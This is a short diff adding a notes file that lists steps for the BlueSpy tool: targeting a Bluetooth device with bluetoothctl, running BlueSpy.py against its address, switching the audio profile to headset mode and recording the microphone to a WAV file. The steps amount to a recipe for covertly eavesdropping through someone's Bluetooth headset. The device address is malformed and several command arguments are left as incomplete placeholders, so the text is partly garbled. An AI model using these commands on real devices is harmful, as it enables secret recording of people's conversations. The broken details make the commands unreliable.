@@ -1,0 +1,8 @@
+Tool link: https://github.com/TarlogicSecurity/BlueSpy
+ 
+bluetoothctl (target: fc:gf:3r:gr:4f infinity)
+
+python BlueSpy.py -a  fc:gf:3r:gr:4f
+next,
+	pactl set-card-profile  (headset-head-unit)
+	parecord --device=      (recording.wav)
